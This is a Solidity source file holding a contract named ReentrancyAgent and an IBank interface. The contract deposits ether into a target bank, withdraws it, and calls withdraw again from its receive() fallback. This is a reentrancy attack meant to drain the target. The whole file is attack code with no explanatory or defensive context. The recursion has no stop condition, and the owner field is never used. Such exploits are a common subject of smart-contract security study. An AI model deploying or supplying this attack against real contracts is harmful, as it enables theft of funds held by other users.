contract ReentrancyAgent {
    IBank public bankTarget;
    address public owner;

    constructor(address _bankTarget) {
        bankTarget = IBank(_bankTarget);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 1 ether);
        bankTarget.deposit{value: msg.value}();
        bankTarget.withdraw(msg.value);
    }

    receive() external payable {
        bankTarget.withdraw(msg.value);

    }
}

interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}